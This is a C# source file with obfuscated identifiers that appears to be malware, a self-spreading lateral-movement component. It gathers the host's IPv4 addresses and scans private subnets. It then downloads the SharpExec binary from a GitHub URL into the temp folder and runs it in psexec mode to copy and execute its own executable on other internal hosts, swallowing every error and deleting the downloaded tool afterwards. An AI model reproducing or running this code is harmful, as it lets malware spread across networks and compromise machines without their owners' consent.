using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Reflection;
using System.Text.RegularExpressions;

namespace OedchgEuvSrX;

internal class DTlZjsQnTvqP
{
	public static List<string> RsQQdTZFtOSJCls = new List<string>();

	public static string sMwNSpmLBnX = "";

	public static void YjxUeifqMskQS()
	{
		try
		{
			RsQQdTZFtOSJCls = cbksAcUngVeO();
		}
		catch
		{
			return;
		}
		string text = "";
		if (RsQQdTZFtOSJCls.Count > 0)
		{
			try
			{
				text = nCHkdORAkNlln();
			}
			catch
			{
				return;
			}
		}
		try
		{
			if (File.Exists(text))
			{
				foreach (string rsQQdTZFtOSJCl in RsQQdTZFtOSJCls)
				{
					string text2 = (sMwNSpmLBnX = rsQQdTZFtOSJCl);
					foreach (string rsQQdTZFtOSJCl2 in RsQQdTZFtOSJCls)
					{
						if (!(rsQQdTZFtOSJCl2 == sMwNSpmLBnX) && (rsQQdTZFtOSJCl2.StartsWith("10.") || text2.StartsWith("172.16.") || text2.StartsWith("192.168.")))
						{
							RdLlDKYVGTt.mSZHpMYIEf(text, "-m=psexec -i=" + sMwNSpmLBnX + " -d=" + rsQQdTZFtOSJCl2 + " -f=" + Assembly.GetEntryAssembly()!.Location + " -e=" + Path.Combine(Path.GetTempPath(), Path.GetRandomFileName().Replace(".", "").Remove(0, 3) + ".exe"));
						}
					}
				}
			}
		}
		catch
		{
		}
		List<GxPmQvxiuKaWzKL> list = GxPmQvxiuKaWzKL.ovuRjJUphuPTErU();
		foreach (GxPmQvxiuKaWzKL item in list)
		{
			try
			{
				if (item.RXAKbhnlOUHnX.StartsWith("10.") || item.RXAKbhnlOUHnX.StartsWith("172.16.") || item.RXAKbhnlOUHnX.StartsWith("192.168."))
				{
					FYbgMYhyLLz.VCcYLuTBMWd(item.hKKDBRnaSuqPfiM, item.RXAKbhnlOUHnX, "255.255.255.0");
				}
			}
			catch
			{
				return;
			}
		}
		foreach (GxPmQvxiuKaWzKL item2 in list)
		{
			try
			{
				Regex regex = new Regex(".");
				string qfBPlofKkoXr = regex.Split(item2.RXAKbhnlOUHnX)[0] + "." + regex.Split(item2.RXAKbhnlOUHnX)[1] + "." + regex.Split(item2.RXAKbhnlOUHnX)[2];
				List<string> list2 = rwLwFwapRqhgalZY.CmdQojtjQPY(qfBPlofKkoXr);
				foreach (string item3 in list2)
				{
					string text2 = (sMwNSpmLBnX = item3);
					foreach (string item4 in list2)
					{
						if (item2.RXAKbhnlOUHnX.StartsWith("10.") || item2.RXAKbhnlOUHnX.StartsWith("172.16.") || item2.RXAKbhnlOUHnX.StartsWith("192.168."))
						{
							RdLlDKYVGTt.mSZHpMYIEf(text, "-m=psexec -i=" + sMwNSpmLBnX + " -d=" + item4 + " -f=" + Assembly.GetEntryAssembly()!.Location + " -e=" + Path.Combine(Path.GetTempPath(), Path.GetRandomFileName().Replace(".", "").Remove(0, 3) + ".exe"));
						}
					}
				}
			}
			catch
			{
				return;
			}
		}
		if (File.Exists(text))
		{
			File.Delete(text);
		}
	}

	public static List<string> cbksAcUngVeO()
	{
		List<string> list = new List<string>();
		IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
		IPAddress[] addressList = hostEntry.AddressList;
		foreach (IPAddress iPAddress in addressList)
		{
			if (iPAddress.AddressFamily.ToString() == "InterNetwork")
			{
				list.Add(iPAddress.ToString());
			}
		}
		return list;
	}

	public static string nCHkdORAkNlln()
	{
		if (IntPtr.Size == 8)
		{
			return GUUEntULzLmhyvZe(new Uri("https://raw.githubusercontent.com/anthemtotheego/SharpExec/master/CompiledBinaries/SharpExec_x64.exe"));
		}
		return GUUEntULzLmhyvZe(new Uri("https://raw.githubusercontent.com/anthemtotheego/SharpExec/master/CompiledBinaries/SharpExec_x86.exe"));
	}

	public static string GUUEntULzLmhyvZe(Uri LrdoVScQaeQRCV)
	{
		string path = Path.GetRandomFileName().Replace(".", "").Remove(0, 3) + ".exe";
		WebClient webClient = new WebClient();
		webClient.DownloadFile(LrdoVScQaeQRCV, Path.Combine(Path.GetTempPath(), path));
		return Path.Combine(Path.GetTempPath(), path);
	}
}
